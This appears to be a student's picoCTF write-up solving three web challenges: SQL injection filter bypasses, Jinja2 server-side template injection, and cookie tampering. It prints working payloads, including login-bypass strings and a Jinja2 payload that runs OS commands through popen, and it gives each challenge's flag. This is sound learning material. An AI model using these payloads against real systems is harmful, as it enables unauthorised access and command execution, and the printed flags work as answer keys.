# 1. Web Gauntlet
This challenge involves bypassing filters in a web application to perform SQL injection. Each round presents different filtering rules, requiring us to adapt our injection techniques accordingly.

## Solution:
1. I started by accessing the login page and noting the URL `http://shape-facility.picoctf.net:57056/`. The initial filter page showed "Filters: ***or…***", indicating the filters. I attempted an injection with username `admin` and any password. The response showed the SQL query:  
`SELECT * FROM users WHERE username='admin' AND password='...'`.  
Recognizing the pattern, I realized SQL injection was possible.

2. I searched for how to comment out parts of SQL queries to bypass conditions. I learned that double hyphens `--` or multiline comment `/*` can be used.  
I tested `admin' --` which worked, as it commented out the rest of the query.
    ```
    SELECT * FROM users WHERE username='admin' -- AND password='gfdgsdbsd’
    ```

3. For the second round, the filters changed to "Round2: or and like = —". The double hyphen was disabled, so I used multiline comments: `admin' /*`. This again worked, allowing me to bypass filters. So the final SQL query that it showed was -
    ```
    SELECT * FROM users WHERE username='admin' /* ' AND password='dvbsdcvcddv’
    ```

4. In the third round, the filters included `or`, `=`, `like`, `>`, `<`, and `—`. I tried the previous method but it didn't work. I then learned that terminating the SQL statement early with a semicolon could help. So I used `admin';` as username and any random password, which allowed me to inject and bypass this round.
    ```
    SELECT * FROM users WHERE username='admin';' AND password='dfsdsdsd’
    ```

5. In the fourth round, I faced filters with "Round4: or and = like > < -- admin". The word "admin" was tricky. After many research and hit and trials I realized that i can concatenate strings using `||` in SQL. I tested `ad'||'min'` as username, which worked to produce admin.
    ```
    SELECT * FROM users WHERE username='ad'||'min';' AND password='fdsfsdfsf’
    ```

6. For the fifth round, the filters included extra "union admin". I was not able to figure out.But it suddenly striked that the previous command was not in the filters. So I used `ad'||'min'` again, which succeeded in bypassing all the rounds.
    ```
    SELECT * FROM users WHERE username='ad'||'min';' AND password='sdfsdfsdfsd’
    ```

7. After refreshing the page, there was no falg showing. After that I noticed my flag was commented out in the PHP code in the filter page. I extracted the flag from the comment: `picoCTF{y0u_m4d3_1t_79a0ddc6}`.

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- I learned that SQL comments `--` and `/* */` can be used to bypass filters.
- Early termination of SQL queries with a semicolon `;` allows injection even when filters restrict certain keywords.
- String concatenation in SQL can be achieved with `||`, in this case we wrote admin using that.
- Using searches and going through different resources to get knowledge about some sql injection techniques.

## Notes:
Initially, I tried using `+` for string concatenation but it didn't work because SQL uses `||`(which i got to know later). Also, I spent some time trying to inject different injection techniques before using concatenation startegy and early termination.

# 2. SSTI1
This challenge involves exploiting a server-side template injection vulnerability on a website that allows users to announce messages. We need to use payloads to read the flag.

## Solution:
1. At first, I was not sure what to do so I checked the full form of SSTI which is Server Side Template Injection.  
2. I tried to input simple commands like `ls` into the message box, but the server just echoed back `ls` itself.
    <img width="1919" height="969" alt="image (2)" src="https://github.com/user-attachments/assets/99754cfe-11f9-40b8-a976-670f1d929291" />

3. Then I watched a video explaining what templates are and how to test for SSTI vulnerabilities. It suggested using payloads like `${{<%[%'"}}%\` to see if the server responds unexpectedly.  
4. I entered the payload `${{<%[%'"}}%\` and got an internal server error which indicated that the server might be vulnerable to SSTI.  
5. Next I needed to identify which template engine was used on the backend because different engines interpret payloads differently. I tested with Django and Jinja2 templates,and the Jinja one worked.  
6. I tried `{{7*7}}` and it returned `49`, indicating Jinja2 was being used. Additionally, `{{7*'7'}}` returned `7777777`.(This was written in the PortSwigger image)

7. In the video he mentioned another resource and I opened a git repo PayloadsAllTheThings to find relevant payloads for Jinja2 SSTI.  
8. I discovered a payload:   
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`   
which executes the `ls` command and lists files.  
9. Using this payload, I saw files like `__pycache__`, `app.py`, `flag`, and `requirements.txt`.  
    <img width="1919" height="1028" alt="image (3)" src="https://github.com/user-attachments/assets/196af0de-a8c3-48bb-8167-258513b88b8b" />

10. To get the flag, I modified the payload to read the `flag` file using cat command:  
`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`.  
11. Executing this payload, I retrieved the flag which is `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}`.

## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:
- Understanding what server-side template injection (SSTI) is.
- Recognizing different template engines like Jinja2 and their syntax.
- How to test for SSTI vulnerabilities using payloads.
- Using payloads to execute system commands through Jinja2 templates.

## Notes:
- Initially I tried simple payloads without knowing the template engine which did not worked.
- I wasted much time to find the correct jinja2 payload that reads the file.

# 3. Cookies
This challenge involves interacting with a web page that responds differently based on the value set in a cookie. The task is to manipulate the cookie value to reveal the hidden flag.

## Solution:
1. I opened the website and saw a message welcoming me to the cookie search page, with a placeholder text "snickerdoodle". When I entered "snickerdoodle" it responded with "I love snickerdoodle cookies!"
2. I then tried entering a random word, and the page responded with "That doesn't appear to be a valid cookie" indicating that the site checks the input.
3. Remembering a similar challenge from Citadel CTF, I opened the developer tools in my browser and navigated to the cookies section of the website.
4. I found a cookie named "name" with a value of "-1".
5. I changed the cookie value to "0" and refreshed the page. It again showed "I love snickerdoodle cookies!"
6. I then changed the value to "1" and refreshed. This time it displayed "I love chocolate chip cookies!"
7. I incremented the number and tried 30, which resulted in the "That doesn't appear to be a valid cookie" message again.
8. I then tried decreasing the number and changing the values.
9. After multiple trials, when I set the cookie value to "18" and refreshed the page displayed the flag: `picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`.
10. This confirmed that setting the cookie to "18" reveals the hidden flag.

## Flag:
```
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```

## Concepts learnt:
- Understanding how web cookies work and how they can be manipulated to change server responses. 
- Recognizing the importance of inspecting cookies via developer tools and modifying their values for testing different outputs.

## Notes:
I thought the key was to guess the cookie value and I entered its value as snickerdoodle which was not correct.
